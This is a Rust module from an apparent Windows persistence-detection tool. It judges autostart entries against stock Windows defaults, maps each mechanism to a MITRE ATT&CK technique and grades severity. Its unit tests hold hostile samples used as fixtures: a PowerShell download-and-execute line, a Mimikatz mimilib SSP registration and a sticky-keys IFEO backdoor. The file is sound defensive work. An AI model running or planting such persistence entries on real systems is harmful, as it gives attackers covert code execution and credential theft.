//! Judgement for the extended autostart catalog (cairn-collectors::asep): which
//! entries are normal for a stock Windows install, which MITRE technique each
//! mechanism maps to, and how severe a non-default entry is. Pure logic.
//!
//! Three kinds of mechanism:
//! - **absent by default** — any entry at all is unusual (AppInit/AppCert DLLs,
//!   cmd AutoRun, SilentProcessExit, Office Test, logon script, policy Run, MPNotify);
//! - **default list** — Windows ships known entries; anything else is unusual
//!   (LSA packages, BootExecute, netsh helpers, print monitors, time providers);
//! - **content** — PowerShell profiles are judged by what the script does.
//!
//! Mechanisms not listed here (Active Setup, COM hijack, screensaver, Winlogon
//! Notify, WOW64 Run keys) rely on persist.rs's generic path/signature signals.
use crate::persist::GateHit;
use crate::trust::{
    is_masquerade, is_under_windows_tree, is_user_writable_path, script_marker_labels,
};
use cairn_core::record::{Mechanism, PersistenceRecord};
use cairn_core::Severity;

/// MITRE ATT&CK technique for every persistence mechanism cairn collects.
pub fn mechanism_mitre(mechanism: Mechanism) -> &'static str {
    match mechanism {
        Mechanism::RunKey
        | Mechanism::Startup
        | Mechanism::ExplorerPolicyRun
        | Mechanism::BootExecute => "T1547.001",
        Mechanism::LsaAuthPackage => "T1547.002",
        Mechanism::TimeProvider => "T1547.003",
        Mechanism::Winlogon | Mechanism::WinlogonNotify | Mechanism::WinlogonMpnotify => {
            "T1547.004"
        }
        Mechanism::LsaSecurityPackage => "T1547.005",
        Mechanism::PrintMonitor => "T1547.010",
        Mechanism::ActiveSetup => "T1547.014",
        Mechanism::Service => "T1543.003",
        Mechanism::ScheduledTask => "T1053.005",
        Mechanism::Screensaver => "T1546.002",
        Mechanism::WmiSubscription => "T1546.003",
        Mechanism::NetshHelper => "T1546.007",
        Mechanism::AppcertDlls => "T1546.009",
        Mechanism::AppinitDlls => "T1546.010",
        Mechanism::Ifeo | Mechanism::SilentExitMonitor => "T1546.012",
        Mechanism::PsProfile => "T1546.013",
        Mechanism::ComHijack => "T1546.015",
        Mechanism::CmdAutorun => "T1546",
        Mechanism::OfficeTest => "T1137.002",
        Mechanism::LogonScript => "T1037.001",
        Mechanism::LsaNotificationPackage => "T1556.002",
        Mechanism::Other => "T1547",
    }
}

/// Mechanisms where Windows ships no entries: any value is worth review.
const ABSENT_BY_DEFAULT: &[Mechanism] = &[
    Mechanism::AppinitDlls,
    Mechanism::AppcertDlls,
    Mechanism::CmdAutorun,
    Mechanism::SilentExitMonitor,
    Mechanism::OfficeTest,
    Mechanism::LogonScript,
    Mechanism::ExplorerPolicyRun,
    Mechanism::WinlogonMpnotify,
];

/// Stock LSA Authentication Packages.
const LSA_AUTH_DEFAULTS: &[&str] = &["msv1_0"];
/// Stock LSA Security Packages across Windows 10/11 and Server 2016+. `""` is the
/// literal two-quote placeholder Windows stores when the list is empty.
const LSA_SECURITY_DEFAULTS: &[&str] = &[
    "kerberos",
    "msv1_0",
    "schannel",
    "wdigest",
    "tspkg",
    "pku2u",
    "cloudap",
    "livessp",
    "negoexts",
    "negotiate",
    "\"\"",
];
/// Stock password-filter / notification packages.
const LSA_NOTIFICATION_DEFAULTS: &[&str] = &["scecli", "rassfm"];
/// Stock netsh helper DLLs (file names).
const NETSH_DEFAULTS: &[&str] = &[
    "authfwcfg.dll",
    "dhcpcmonitor.dll",
    "dot3cfg.dll",
    "fwcfg.dll",
    "hnetmon.dll",
    "ifmon.dll",
    "napmontr.dll",
    "netiohlp.dll",
    "nettrace.dll",
    "nshhttp.dll",
    "nshipsec.dll",
    "nshwfp.dll",
    "p2pnetsh.dll",
    "peerdistsh.dll",
    "rasmontr.dll",
    "rpcnsh.dll",
    "wcnnetsh.dll",
    "whhelper.dll",
    "wlancfg.dll",
    "wshelper.dll",
    "wwancfg.dll",
    "dhcpmonitor.dll",
    "ipmontr.dll",
    "ippromon.dll",
];
/// Stock port-monitor DLLs (file names).
const PRINT_MONITOR_DEFAULTS: &[&str] = &[
    "localspl.dll",
    "tcpmon.dll",
    "usbmon.dll",
    "wsdmon.dll",
    "apmon.dll",
    "appmon.dll",
    "fxsmon.dll",
    "pjlmon.dll",
];
/// Stock time-provider DLLs (file names).
const TIME_PROVIDER_DEFAULTS: &[&str] = &["w32time.dll", "vmictimeprovider.dll"];

/// Accessibility binaries reachable from the logon screen; an IFEO debugger on one
/// of them is the classic "sticky keys" backdoor (T1546.008).
pub const ACCESSIBILITY_BINARIES: &[&str] = &[
    "sethc.exe",
    "utilman.exe",
    "osk.exe",
    "magnify.exe",
    "narrator.exe",
    "displayswitch.exe",
    "atbroker.exe",
];

fn file_name(path: &str) -> String {
    path.trim_matches('"')
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .to_ascii_lowercase()
}

/// True if this entry is part of a stock Windows install for its mechanism. Only
/// meaningful for default-list mechanisms; others return false.
fn is_stock_entry(p: &PersistenceRecord) -> bool {
    let item = p
        .command
        .as_deref()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    let path = p.binary_path.as_deref().unwrap_or("");
    // A stock DLL must also resolve under the Windows tree: "C:\Temp\localspl.dll"
    // is not the stock print monitor.
    let stock_file =
        |list: &[&str]| list.contains(&file_name(path).as_str()) && is_under_windows_tree(path);
    match p.mechanism {
        Mechanism::LsaAuthPackage => LSA_AUTH_DEFAULTS.contains(&item.as_str()),
        Mechanism::LsaSecurityPackage => LSA_SECURITY_DEFAULTS.contains(&item.as_str()),
        Mechanism::LsaNotificationPackage => LSA_NOTIFICATION_DEFAULTS.contains(&item.as_str()),
        Mechanism::BootExecute => item.starts_with("autocheck autochk"),
        Mechanism::NetshHelper => stock_file(NETSH_DEFAULTS),
        Mechanism::PrintMonitor => stock_file(PRINT_MONITOR_DEFAULTS),
        Mechanism::TimeProvider => stock_file(TIME_PROVIDER_DEFAULTS),
        _ => false,
    }
}

fn is_default_list_mechanism(m: Mechanism) -> bool {
    matches!(
        m,
        Mechanism::LsaAuthPackage
            | Mechanism::LsaSecurityPackage
            | Mechanism::LsaNotificationPackage
            | Mechanism::BootExecute
            | Mechanism::NetshHelper
            | Mechanism::PrintMonitor
            | Mechanism::TimeProvider
    )
}

/// Untrusted target: explicitly unsigned, in a user-writable drop zone, or a
/// system-name masquerade.
fn untrusted_target(p: &PersistenceRecord) -> bool {
    let path = p.binary_path.as_deref().unwrap_or("");
    p.signed == Some(false) || is_user_writable_path(path) || is_masquerade(path)
}

/// Mechanism-specific gate signal for the extended catalog, IFEO accessibility
/// backdoors and PowerShell profiles. None = no mechanism-specific signal (the generic
/// path/signature signals in persist.rs still apply).
pub(crate) fn asep_signal(p: &PersistenceRecord) -> Option<GateHit> {
    let m = p.mechanism;
    let mitre = mechanism_mitre(m);
    let target = p
        .binary_path
        .as_deref()
        .or(p.command.as_deref())
        .unwrap_or("-");

    if m == Mechanism::Ifeo {
        let image = p.value.as_deref().unwrap_or("").to_ascii_lowercase();
        if ACCESSIBILITY_BINARIES.contains(&image.as_str()) {
            return Some(GateHit {
                severity: Severity::High,
                label: "協助工具後門（IFEO）",
                reason: format!(
                    "IFEO Debugger on accessibility binary {image} (reachable from the logon \
                     screen without signing in): {}",
                    p.command.as_deref().unwrap_or("-")
                ),
                mitre: "T1546.008",
            });
        }
        return None;
    }

    if m == Mechanism::PsProfile {
        let markers = script_marker_labels(p.command.as_deref().unwrap_or(""));
        if markers.is_empty() {
            return None;
        }
        return Some(GateHit {
            severity: Severity::High,
            label: "PowerShell 設定檔含下載或編碼內容",
            reason: format!(
                "PowerShell profile {} runs at every PowerShell start and contains {}",
                p.location,
                markers.join(", ")
            ),
            mitre,
        });
    }

    let severity = if untrusted_target(p) {
        Severity::High
    } else {
        Severity::Medium
    };

    if ABSENT_BY_DEFAULT.contains(&m) {
        return Some(GateHit {
            severity,
            label: absent_label(m),
            reason: format!(
                "{m} has an entry, but stock Windows ships none ({}): {target}",
                p.location
            ),
            mitre,
        });
    }

    if is_default_list_mechanism(m) && !is_stock_entry(p) {
        return Some(GateHit {
            severity,
            label: default_list_label(m),
            reason: format!(
                "{m} entry is not part of a stock Windows install ({}): {}",
                p.location,
                p.command.as_deref().unwrap_or("-")
            ),
            mitre,
        });
    }

    None
}

fn absent_label(m: Mechanism) -> &'static str {
    match m {
        Mechanism::AppinitDlls => "AppInit_DLLs 載入 DLL",
        Mechanism::AppcertDlls => "AppCertDlls 載入 DLL",
        Mechanism::CmdAutorun => "cmd.exe AutoRun 指令",
        Mechanism::SilentExitMonitor => "SilentProcessExit 監視程式",
        Mechanism::OfficeTest => "Office Test 機碼載入 DLL",
        Mechanism::LogonScript => "使用者登入腳本",
        Mechanism::ExplorerPolicyRun => "原則 Run 機碼自動執行",
        Mechanism::WinlogonMpnotify => "Winlogon MPNotify 程式",
        _ => "非預設自動執行項目",
    }
}

fn default_list_label(m: Mechanism) -> &'static str {
    match m {
        Mechanism::LsaAuthPackage => "非預設 LSA 驗證套件",
        Mechanism::LsaSecurityPackage => "非預設 LSA 安全性套件",
        Mechanism::LsaNotificationPackage => "非預設密碼篩選器",
        Mechanism::BootExecute => "非預設 BootExecute 程式",
        Mechanism::NetshHelper => "非預設 netsh helper DLL",
        Mechanism::PrintMonitor => "非預設列印監視器",
        Mechanism::TimeProvider => "非預設時間提供者",
        _ => "非預設自動執行項目",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rec(
        mechanism: Mechanism,
        value: &str,
        command: &str,
        binary_path: Option<&str>,
    ) -> PersistenceRecord {
        PersistenceRecord {
            mechanism,
            location: format!(r"HKLM\...\{mechanism}"),
            value: Some(value.into()),
            command: Some(command.into()),
            binary_path: binary_path.map(str::to_string),
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write: None,
            bound: None,
            signer_source: None,
            service_start: None,
        }
    }

    #[test]
    fn stock_lsa_packages_are_not_flagged() {
        for pkg in [
            "kerberos", "msv1_0", "schannel", "wdigest", "tspkg", "pku2u", "cloudap",
        ] {
            let p = rec(
                Mechanism::LsaSecurityPackage,
                "Security Packages",
                pkg,
                None,
            );
            assert!(asep_signal(&p).is_none(), "{pkg}");
        }
        let p = rec(
            Mechanism::LsaAuthPackage,
            "Authentication Packages",
            "msv1_0",
            None,
        );
        assert!(asep_signal(&p).is_none());
    }

    /// mimilib registered as an SSP is the classic Mimikatz persistence (T1547.005).
    #[test]
    fn unknown_security_package_is_flagged() {
        let p = rec(
            Mechanism::LsaSecurityPackage,
            "Security Packages",
            "mimilib",
            Some(r"C:\Windows\System32\mimilib.dll"),
        );
        let hit = asep_signal(&p).expect("non-stock SSP must gate");
        assert_eq!(hit.mitre, "T1547.005");
        assert_eq!(hit.severity, Severity::Medium);
    }

    #[test]
    fn unsigned_non_stock_entry_is_high() {
        let mut p = rec(
            Mechanism::LsaNotificationPackage,
            "Notification Packages",
            "evilfilter",
            Some(r"C:\Windows\System32\evilfilter.dll"),
        );
        p.signed = Some(false);
        let hit = asep_signal(&p).unwrap();
        assert_eq!(hit.severity, Severity::High);
        assert_eq!(hit.mitre, "T1556.002");
    }

    #[test]
    fn stock_boot_execute_is_not_flagged_but_extra_is() {
        let p = rec(
            Mechanism::BootExecute,
            "BootExecute",
            "autocheck autochk *",
            None,
        );
        assert!(asep_signal(&p).is_none());
        let p = rec(
            Mechanism::BootExecute,
            "BootExecute",
            r"\??\C:\Temp\x.exe",
            None,
        );
        assert_eq!(asep_signal(&p).unwrap().mitre, "T1547.001");
    }

    /// A stock DLL name outside the Windows tree is not the stock DLL.
    #[test]
    fn stock_name_outside_windows_is_flagged() {
        let p = rec(
            Mechanism::PrintMonitor,
            "Local Port",
            r"C:\Users\Public\localspl.dll",
            Some(r"C:\Users\Public\localspl.dll"),
        );
        let hit = asep_signal(&p).unwrap();
        assert_eq!(hit.severity, Severity::High, "user-writable path => High");
        assert_eq!(hit.mitre, "T1547.010");
        let ok = rec(
            Mechanism::PrintMonitor,
            "Local Port",
            "localspl.dll",
            Some(r"C:\Windows\System32\localspl.dll"),
        );
        assert!(asep_signal(&ok).is_none());
    }

    #[test]
    fn any_absent_by_default_entry_is_flagged() {
        for m in ABSENT_BY_DEFAULT {
            let p = rec(*m, "x", r"C:\Tools\x.exe", Some(r"C:\Tools\x.exe"));
            let hit = asep_signal(&p).unwrap_or_else(|| panic!("{m} must gate"));
            assert_eq!(hit.mitre, mechanism_mitre(*m));
        }
    }

    #[test]
    fn ifeo_on_accessibility_binary_is_t1546_008() {
        let p = rec(
            Mechanism::Ifeo,
            "sethc.exe",
            r"C:\Windows\System32\cmd.exe",
            None,
        );
        let hit = asep_signal(&p).unwrap();
        assert_eq!(hit.mitre, "T1546.008");
        assert_eq!(hit.severity, Severity::High);
        let p = rec(Mechanism::Ifeo, "notepad.exe", r"C:\Tools\npp.exe", None);
        assert!(
            asep_signal(&p).is_none(),
            "generic IFEO handled by persist.rs"
        );
    }

    #[test]
    fn ps_profile_judged_by_content() {
        let benign = rec(
            Mechanism::PsProfile,
            "profile.ps1",
            "Set-Alias ll Get-ChildItem",
            None,
        );
        assert!(asep_signal(&benign).is_none());
        let bad = rec(
            Mechanism::PsProfile,
            "profile.ps1",
            "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')",
            None,
        );
        let hit = asep_signal(&bad).unwrap();
        assert_eq!(hit.mitre, "T1546.013");
        assert!(hit.reason.contains("DownloadString"));
    }

    /// Generic-signal mechanisms get no mechanism-specific hit.
    #[test]
    fn generic_mechanisms_have_no_specific_signal() {
        for m in [
            Mechanism::ActiveSetup,
            Mechanism::ComHijack,
            Mechanism::Screensaver,
            Mechanism::WinlogonNotify,
            Mechanism::RunKey,
        ] {
            let p = rec(
                m,
                "x",
                r"C:\Windows\System32\x.exe",
                Some(r"C:\Windows\System32\x.exe"),
            );
            assert!(asep_signal(&p).is_none(), "{m}");
        }
    }

    /// End to end through PersistHeuristic: a non-stock SSP becomes a Finding with its
    /// technique and a reason; a stock one stays inventory (an Observation).
    #[test]
    fn persist_heuristic_turns_non_stock_ssp_into_a_finding() {
        use cairn_core::record::Record;
        use cairn_core::traits::Analyzer;
        let bad = rec(
            Mechanism::LsaSecurityPackage,
            "Security Packages",
            "mimilib",
            Some(r"C:\Windows\System32\mimilib.dll"),
        );
        let good = rec(
            Mechanism::LsaSecurityPackage,
            "Security Packages",
            "kerberos",
            Some(r"C:\Windows\System32\kerberos.dll"),
        );
        let records = vec![Record::Persistence(bad), Record::Persistence(good)];
        let h = crate::PersistHeuristic;
        let findings = h.analyze(&records, &[]).unwrap();
        assert_eq!(findings.len(), 1);
        assert!(findings[0].mitre.contains(&"T1547.005".to_string()));
        assert!(findings[0].reason.as_deref().unwrap().contains("mimilib"));
        let obs = h.observe(&records).unwrap();
        assert_eq!(obs.len(), 1, "stock kerberos stays inventory");
    }

    #[test]
    fn every_mechanism_has_a_specific_technique() {
        for m in Mechanism::ALL {
            assert!(mechanism_mitre(*m).starts_with('T'), "{m}");
        }
    }
}
